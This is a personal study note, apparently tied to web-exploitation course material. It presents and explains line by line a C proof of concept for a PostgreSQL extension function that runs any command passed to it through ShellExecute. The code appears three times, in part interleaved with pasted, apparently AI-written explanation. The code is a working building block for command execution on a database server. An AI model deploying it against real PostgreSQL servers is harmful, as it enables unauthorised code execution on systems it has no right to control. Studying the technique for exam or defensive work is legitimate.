---
{"dg-publish":true,"permalink":"/1-hack-like-a-script-kiddie/web/postgres-sql/poc-c-local-execution-arking/","noteIcon":"","created":"2025-04-15T14:11:19.611-04:00"}
---














Certainly! Let's break down the code step by step. This code is written in C and is used to define a custom PostgreSQL function.

### Explanation in Markdown Format

#### 1. Include Necessary Headers

```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"
```

- `postgres.h`: Core PostgreSQL definitions.
- `string.h`: Standard C library for string functions.
- `fmgr.h`: Definitions for PostgreSQL function manager.
- `utils/geo_decls.h`: Geographic data type declarations.
- `stdio.h`: Standard C library for input and output functions.
- `utils/builtins.h`: Built-in PostgreSQL functions.

#### 2. Module Magic

```c
#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif
```

This part is required for PostgreSQL to recognize the module.

#### 3. Function Declaration

```c
/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(awae);
```

- `PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);`: Declares the function `awae`.
- `PG_FUNCTION_INFO_V1(awae);`: Registers the function with PostgreSQL.

#### 4. Function Definition

```c
Datum
awae(PG_FUNCTION_ARGS)
{
    /* convert text pointer to C string */
    #define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
```

- `Datum`: PostgreSQL data type for returning values.
- `PG_FUNCTION_ARGS`: Macro that provides access to function arguments.
- `GET_STR(textp)`: Macro to convert PostgreSQL text to C string.

#### 5. Retrieve and Use Arguments

```c
    /* retrieve the second argument that is passed to the function (an integer)
    that will serve as our counter limit*/

    int instances = PG_GETARG_INT32(1);

    for (int c = 0; c < instances; c++) {
        /*launch the process passed in the first parameter*/
        ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
    }
    PG_RETURN_VOID();
}
```

- `int instances = PG_GETARG_INT32(1);`: Retrieves the second argument as an integer, which serves as the counter limit.
- `for (int c = 0; c < instances; c++)`: Loop that runs from 0 to `instances - 1`.
- `ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);`: Executes the command passed as the first argument in each loop iteration.
- `PG_RETURN_VOID();`: Indicates that the function returns no value.

### Full Code

```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
```
postgres.h: Core PostgreSQL definitions.
string.h: Standard C library for string functions.
fmgr.h: Definitions for PostgreSQL function manager.
utils/geo_decls.h: Geographic data type declarations.
stdio.h: Standard C library for input and output functions.
utils/builtins.h: Built-in PostgreSQL functions.

```c
PG_MODULE_MAGIC;
#endif
```
This part is required for PostgreSQL to recognize the module.



```c
/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(awae);
```
PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);: Declares the function awae.
PG_FUNCTION_INFO_V1(awae);: Registers the function with PostgreSQL.

```c
/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
awae(PG_FUNCTION_ARGS)
{
    /* convert text pointer to C string */
    #define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
```
Datum: PostgreSQL data type for returning values.
PG_FUNCTION_ARGS: Macro that provides access to function arguments.
GET_STR(textp): Macro to convert PostgreSQL text to C string.

```
    /* retrieve the second argument that is passed to the function (an integer)
    that will serve as our counter limit*/

    int instances = PG_GETARG_INT32(1);

    for (int c = 0; c < instances; c++) {
        /*launch the process passed in the first parameter*/
        ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
    }
    PG_RETURN_VOID();
}
```
int instances = PG_GETARG_INT32(1);: Retrieves the second argument as an integer, which serves as the counter limit.
for (int c = 0; c < instances; c++): Loop that runs from 0 to instances - 1.
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);: Executes the command passed as the first argument in each loop iteration.
PG_RETURN_VOID();: Indicates that the function returns no value.

This code defines a PostgreSQL function that takes two arguments: a command to execute and a number of times to execute it. It then runs the command the specified number of times.

---

```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(awae);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
awae(PG_FUNCTION_ARGS)
{
    /* convert text pointer to C string */
    #define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

    /* retrieve the second argument that is passed to the function (an integer)
    that will serve as our counter limit*/

    int instances = PG_GETARG_INT32(1);

    for (int c = 0; c < instances; c++) {
        /*launch the process passed in the first parameter*/
        ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
    }
    PG_RETURN_VOID();
}

```




